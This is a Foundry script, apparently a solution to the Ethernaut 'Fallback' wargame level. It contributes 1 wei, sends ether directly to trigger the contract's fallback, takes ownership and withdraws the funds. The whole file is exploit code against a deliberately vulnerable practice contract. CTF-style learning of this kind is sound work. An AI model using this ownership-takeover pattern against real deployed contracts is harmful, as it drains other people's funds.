// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "src/01/Fallback.sol";

contract Exploit is Script {

      //////////////////////////////////////////
      // CHANGE: add the current instance address
      /////////////////////////////////////////
    
      address level_instance = 0xD4E2471CA863251b61a1009223Ee23D2F23f057d;
      Fallback level = Fallback(payable(address(level_instance)));

      function run() public {

          vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

          //////////////////////////////
          // Copy the exploit from test
          //////////////////////////////
          level.contribute{value: 1 wei}();
          (bool sent, ) = address(level).call{value: 1 wei}("");
          require(sent, "Failed to call send()");
          level.withdraw();

          vm.stopBroadcast();
    }
}